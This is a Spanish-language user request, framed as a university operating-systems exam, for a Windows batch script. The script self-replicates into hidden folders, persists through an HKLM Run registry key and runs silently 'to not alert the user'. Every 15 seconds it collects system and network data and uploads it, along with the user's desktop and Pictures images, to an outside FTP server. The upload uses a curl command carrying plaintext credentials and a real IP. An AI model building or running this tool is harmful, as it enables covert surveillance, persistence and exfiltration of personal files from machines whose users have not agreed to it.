Hola. Necesito que me ayudes a desarrollar un script en Windows Batch (.bat) optimizado y adaptado estrictamente a los requerimientos de un examen universitario de Sistemas Operativos. El script debe ser robusto, completamente automatizado y con manejo de errores silencioso.

A continuación, te detallo los parámetros y la estructura exacta que debe cumplir el código:

# Especificaciones del Script Batch - GR03_Rios

## 1. Variables Globales y Nomenclatura del Archivo

Nombre del archivo .bat: Debe llamarse exactamente: `GR03_Rios_%COMPUTERNAME%.bat`

Título de la consola (title): `GR03_Rios Maldonado Julio Cesar_%COMPUTERNAME%`

Variables internas obligatorias:

```bat
set "GRUPO=GR03"
set "APELLIDO=Rios"
set "MAQUINA=%COMPUTERNAME%"
set "ruta=GR03_Rios_%COMPUTERNAME%"
```

---

## 2. Ciclo de Réplica, Persistencia y Robustez Local

- **Creación de directorios:** Debe crear la carpeta `parcial` en dos ubicaciones raíz: `C:\parcial` y `%TEMP%\parcial`.
- **Mecanismo de Autoreplicación:** Al iniciar, el script debe verificar desde dónde se está ejecutando. Si no está en las carpetas mencionadas, debe sacar copias idénticas de sí mismo en ambas rutas (`C:\parcial` y `%TEMP%\parcial`) manteniendo el nombre dinámico del archivo.
- **Persistencia mediante Regedit:** Debe agregar una entrada al arranque de Windows de la siguiente manera, apuntando **estrictamente a la ruta temporal** para tolerar el borrado de la carpeta del disco `C:\`:

```cmd
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Rios" /t REG_SZ /d "%temp%\parcial\GR03_Rios_%COMPUTERNAME%.bat" /f
```

- **Ocultamiento Total (Criterio de Evaluación):** El script debe aplicar atributos de sistema (`attrib +h +s`) a las dos carpetas (`C:\parcial` y `%TEMP%\parcial`) y a todos los archivos que contengan, garantizando que permanezcan invisibles en el explorador de archivos.

---

## 3. Generación del Reporte Técnico (.txt)

Dentro de la carpeta de trabajo, debe generar y actualizar constantemente un archivo de texto denominado `GR03_Rios_%COMPUTERNAME%.txt`. El contenido exacto del archivo debe estructurarse con los siguientes puntos literales:

- **3.1. Título:** Información de la máquina `%COMPUTERNAME%`
- **3.2. Autor:** `GR03_Rios`
- **3.3. Fecha:** [Fecha actual del sistema]
- **3.4. Hora:** [Hora actual del sistema]
- **3.5. Versión del sistema operativo:** [Salida limpia del comando `ver`]
- **3.6. Memoria:** [Total de memoria RAM física extraída preferiblemente por comando tipo `wmic` o similar]
- **3.7. IP actuales:** [Dirección IPv4 limpia]
- **3.8. MAC actuales:** [Dirección física MAC de la tarjeta de red activa]
- **3.9. Usuario actual:** `%USERNAME%`
- **3.10. Nombre de la máquina:** `%COMPUTERNAME%`
- **3.11. Puertos abiertos y conexiones:** [Salida completa de `netstat -ano`]
- **3.12. Listar procesos activos:** [Salida completa de `tasklist`]
- **3.13. Cuál proceso es el que más memoria consume:** [Filtrado avanzado que extraiga el nombre del proceso líder en uso de RAM]
- **3.14. Cuál es el proceso que más procesador consume:** [Filtrado avanzado que extraiga el nombre del proceso líder en uso de CPU]

---

## 4. Lógica del Bucle Infinito y Exfiltración de Datos (Cada 15 Segundos)

El script debe entrar en un bucle recurrente que se ejecute estrictamente cada 15 segundos (`timeout /t 15 /nobreak`) realizando de manera desatendida las siguientes acciones:

### 4.1. Re-generar el reporte .txt

Reescribir por completo el archivo técnico tanto en `C:\parcial\` como en `%TEMP%\parcial\` para reflejar los cambios en tiempo real. Si la carpeta fue borrada manualmente por el evaluador en pleno bucle, el script debe volver a crearla inmediatamente antes de escribir el archivo (tolerancia a fallos para evitar el 0.0 de la rúbrica).

### 4.2. Subir el reporte vía FTP

Utilizar el comando `curl` con las credenciales dadas para subir el reporte a la nube respetando la variable de ruta dinámica:

```bat
curl -u "u917850771:Unicesar2026+" --ftp-create-dirs -T "C:\parcial\GR03_Rios_%COMPUTERNAME%.txt" "ftp://82.25.87.225/domains/sistemasoperativos.xyz/NubeParcial/%ruta%/GR03_Rios_%COMPUTERNAME%.txt"
```

### 4.3. Subir las imágenes exigidas

- Debe buscar el archivo específico `imagen1.jpg` en el Escritorio del usuario (`%USERPROFILE%\Desktop`) y, si existe, subirlo al FTP dentro de la subcarpeta `Escritorio`.
- Debe buscar el archivo específico `imagen2.jpg` en la carpeta de imágenes del usuario (`%USERPROFILE%\Pictures`) y, si existe, subirlo al FTP dentro de la subcarpeta `Imágenes`.

---

## 5. Requerimientos de Ejecución y Entrega (Modo Producción)

### 5.1. Silencio Absoluto

El script no debe mostrar ninguna salida en la terminal (`@echo off`, redireccionamiento de comandos mediante `>nul 2>&1`), de manera que la consola permanezca oculta o completamente limpia.

### 5.2. Flexibilidad en las Credenciales

Dado que los parámetros como rutas FTP, contraseñas y nombres de carpetas serán modificados el día del parcial por el docente, estructurar la sección de configuración mediante variables bien definidas al inicio del archivo para facilitar cambios veloces en caliente.

---

## Resumen de Estructura del Script

| Elemento        | Descripcion                                                      |
| --------------- | ---------------------------------------------------------------- |
| Nombre archivo  | `GR03_Rios_%COMPUTERNAME%.bat`                                   |
| Título consola  | `GR03_Rios Maldonado Julio Cesar_%COMPUTERNAME%`                 |
| Directorios     | `C:\parcial` y `%TEMP%\parcial`                                  |
| Reporte         | `GR03_Rios_%COMPUTERNAME%.txt`                                   |
| Intervalo bucle | 15 segundos                                                      |
| Persistencia    | Registro `HKLM\Run` apuntando a `%TEMP%`                         |
| Ocultamiento    | `attrib +h +s` en carpetas y archivos                            |
| FTP destino     | `ftp://82.25.87.225/domains/sistemasoperativos.xyz/NubeParcial/` |
| Silencio        | `@echo off` y `>nul 2>&1` global                                 |

---

## Notas de Implementacion

1. El script debe verificar su ubicacion al iniciar y autoreplicarse si es necesario.
2. La persistencia en el registro debe apuntar **unicamente** a `%TEMP%` para garantizar funcionamiento incluso si se elimina `C:\parcial`.
3. El bucle infinito debe recrear los directorios si estos son eliminados durante la ejecucion.
4. Todos los comandos deben ejecutarse en modo silencioso para no alertar al usuario o evaluador.
5. Las variables de configuracion (FTP, credenciales, rutas) deben estar claramente definidas al inicio del archivo para permitir cambios rapidos.
